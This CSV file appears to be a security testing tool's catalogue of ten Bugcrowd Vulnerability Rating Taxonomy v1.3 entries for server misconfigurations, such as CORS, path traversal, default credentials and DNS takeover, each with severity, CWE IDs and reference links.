TID,TSource,TTestName,TType,TDescription,TIssueName,TIssueType,TSeverity,TTesterSupport,TPhase,TSection,TStep,TIssueBackground,TRemediationBackground,TStdTest,TRef1,TRef2,TTRef,TCweID,TPCI,TTop10,TTop25
BCVRT-001,BCVRT,Unsafe Cross-Origin Resource Sharing,BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Unsafe Cross-Origin Resource Sharing,Unsafe Cross-Origin Resource Sharing,,2,,,,1,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-942,,,
BCVRT-005,BCVRT,Same-Site Scripting (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Same-Site Scripting,Same-Site Scripting (P5),,3,,,,5,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-006,BCVRT,"SSL Attack (BREACH, POODLE etc.)",BugCrowd Vuln Rating Taxonomy v1.3,"Server Security Misconfiguration; SSL Attack (BREACH, POODLE etc.)","SSL Attack (BREACH, POODLE etc.)",,2,,,,6,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-310,,,
BCVRT-003,BCVRT,Directory Listing Enabled: Sensitive Data Exposure,BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Directory Listing Enabled: Sensitive Data Exposure,Information Exposure Through Directory Listing (CWE-548),,2,,,,3,"A directory listing is inappropriately exposed, yielding potentially sensitive information to attackers.",,,http://projects.webappsec.org/w/page/13246922/Directory%20Indexing,https://wiki.apache.org/httpd/DirectoryListings,,548,,,
BCVRT-008,BCVRT,Using Default Credentials: Staging/Development Server (P2),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Using Default Credentials: Staging/Development Server,Using Default Credentials: Staging/Development Server (P2),,2,,,,8,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-009,BCVRT,Misconfigured DNS: Subdomain Takeover (P2),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Misconfigured DNS: Subdomain Takeover,Misconfigured DNS: Subdomain Takeover (P2),,2,,,,9,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-010,BCVRT,Misconfigured DNS: Zone Transfer (P4),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Misconfigured DNS: Zone Transfer,Misconfigured DNS: Zone Transfer (P4),,3,,,,10,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-669,,,
BCVRT-002,BCVRT,Path Traversal,BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Path Traversal,Path Traversal,,2,,,,2,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-22,,,
BCVRT-004,BCVRT,Directory Listing Enabled: Non-Sensitive Data Exposure (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Directory Listing Enabled: Non-Sensitive Data Exposure,Information Exposure Through Directory Listing (CWE-548),,3,,,,4,"A directory listing is inappropriately exposed, yielding potentially sensitive information to attackers.",,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,548,,,
BCVRT-007,BCVRT,Using Default Credentials: Production Server (P1),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Using Default Credentials: Production Server,Using Default Credentials: Production Server (P1),,2,,,,7,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
